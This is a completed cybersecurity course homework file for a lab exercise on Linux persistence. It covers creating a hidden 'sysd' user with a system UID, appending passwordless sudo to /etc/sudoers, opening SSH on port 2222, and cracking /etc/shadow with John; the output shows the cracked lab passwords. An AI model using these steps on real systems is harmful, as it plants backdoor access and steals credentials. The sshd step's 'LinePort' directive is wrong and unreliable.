## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - useradd -M sysd

2. Give your secret user a password: 
    - passwd sysd
	Cyb3rs3cur1ty1018

3. Give your secret user a system UID < 1000:
    - usermod -u 99 sysd

4. Give your secret user the same GID:
   - groupmod -g 99 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  echo "sysd ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

6. Test that `sudo` access works without your password:

    ```bash
    $ sudo su sysd
    $ whoami
    sysd
    $ sudo su
    $ whoami
    root
    **********************another way to test************
    sudo cat /etc/shadow
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
     vi /etc/ssh/sshd_config
     #add below line to start listening to port 2222
     LinePort 2222
     #save file :wq
     
     #restart sshd daemon
     systemctl restart sshd
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - systemctl restart sshd

2. Exit the `root` account:
    - exit
      exit
      exit	

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    - sudo su

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - sudo su
      john /etc/shadow
      #check status of john
      john --show /etc/shadow
      #check if john is running
      ps -ef | grep john
      
      root@scavenger-hunt:/# john /etc/shadow
      Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
      Press 'q' or Ctrl-C to abort, almost any other key for status
      computer         (stallman)
      freedom          (babbage)
      trustno1         (mitnik)
      dragon           (lovelace)
      lakers           (turing)
      passw0rd         (sysadmin)
      Goodluck!        (student)


---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

